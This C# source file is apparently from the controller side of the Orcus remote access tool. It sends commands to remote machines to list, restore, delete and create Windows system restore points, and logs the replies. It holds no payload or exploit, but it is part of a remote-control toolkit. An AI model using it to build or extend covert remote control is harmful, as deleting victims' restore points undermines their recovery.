using System;
using System.Collections.Generic;
using System.Text;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.SystemRestore;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.SystemRestore
{
    [DescribeCommandByEnum(typeof (SystemRestoreCommunication))]
    public class SystemRestoreCommand : Command
    {
        public event EventHandler<List<SystemRestorePointInfo>> SystemRestorePointsReceived;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((SystemRestoreCommunication) parameter[0])
            {
                case SystemRestoreCommunication.ResponseRestorePoints:
                    var systemRestorePoints = new Serializer(typeof (List<SystemRestorePointInfo>))
                        .Deserialize<List<SystemRestorePointInfo>>(
                            parameter, 1);
                    foreach (var systemRestorePoint in systemRestorePoints)
                        systemRestorePoint.CreationDate = systemRestorePoint.CreationDate.ToLocalTime();

                    SystemRestorePointsReceived?.Invoke(this, systemRestorePoints);
                    LogService.Receive((string) Application.Current.Resources["SystemRestorePointsReceived"]);
                    break;
                case SystemRestoreCommunication.ResponseNoAccess:
                    LogService.Error((string) Application.Current.Resources["NoPrivileges"]);
                    break;
                case SystemRestoreCommunication.ResponseBeginRestore:
                    LogService.Receive((string) Application.Current.Resources["ResponseBeginRestorePoint"]);
                    break;
                case SystemRestoreCommunication.ResponseRestoreSucceed:
                    LogService.Receive((string) Application.Current.Resources["ResponseSystemRestoreSucceed"]);
                    break;
                case SystemRestoreCommunication.ResponseRestoreFailed:
                    LogService.Error((string) Application.Current.Resources["ResponseSystemRestoreFailed"]);
                    break;
                case SystemRestoreCommunication.ResponseRemoveSucceed:
                    LogService.Receive((string) Application.Current.Resources["ResponseSystemRestorePointRemoved"]);
                    break;
                case SystemRestoreCommunication.ResponseRemoveFailed:
                    LogService.Error((string) Application.Current.Resources["ResponseSystemRestorePointRemoveFailed"]);
                    break;
                case SystemRestoreCommunication.ResponseCreatingRestorePoint:
                    LogService.Receive((string) Application.Current.Resources["ResponseCreatingSystemRestorePoint"]);
                    break;
                case SystemRestoreCommunication.ResponseCreateRestorePointSucceed:
                    LogService.Receive((string) Application.Current.Resources["ResponseSystemRestorePointCreated"]);
                    break;
                case SystemRestoreCommunication.ResponseCreateRestorePointFailed:
                    LogService.Error((string) Application.Current.Resources["ResponseSystemRestorePointCreationFailed"]);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void GetRestorePoints()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) SystemRestoreCommunication.GetRestorePoints});
            LogService.Send((string) Application.Current.Resources["GetSystemRestorePoints"]);
        }

        public void RestorePoint(SystemRestorePointInfo systemRestorePointInfo)
        {
            var data = new byte[5];
            data[0] = (byte) SystemRestoreCommunication.RestorePoint;
            Array.Copy(BitConverter.GetBytes(systemRestorePointInfo.SequenceNumber), 0, data, 1, 4);
            ConnectionInfo.SendCommand(this, data);
            LogService.Send(string.Format((string) Application.Current.Resources["SendRestorePoint"],
                systemRestorePointInfo.SequenceNumber));
        }

        public void RemoveRestorePoint(SystemRestorePointInfo systemRestorePointInfo)
        {
            var data = new byte[5];
            data[0] = (byte) SystemRestoreCommunication.RemoveRestorePoint;
            Array.Copy(BitConverter.GetBytes(systemRestorePointInfo.SequenceNumber), 0, data, 1, 4);
            ConnectionInfo.SendCommand(this, data);
            LogService.Send(string.Format((string) Application.Current.Resources["SendRemoveRestorePoint"],
                systemRestorePointInfo.SequenceNumber));
        }

        public void CreateRestorePoint(RestoreType restoreType, EventType eventType, string description)
        {
            var descriptionData = Encoding.UTF8.GetBytes(description);
            var data = new byte[3 + descriptionData.Length];
            data[0] = (byte) SystemRestoreCommunication.CreateRestorePoint;
            data[1] = (byte) restoreType;
            data[2] = (byte) eventType;
            Array.Copy(descriptionData, 0, data, 3, description.Length);
            ConnectionInfo.SendCommand(this, data);
            LogService.Send((string) Application.Current.Resources["CreateSystemRestorePoint"]);
        }

        protected override uint GetId()
        {
            return 28;
        }
    }
}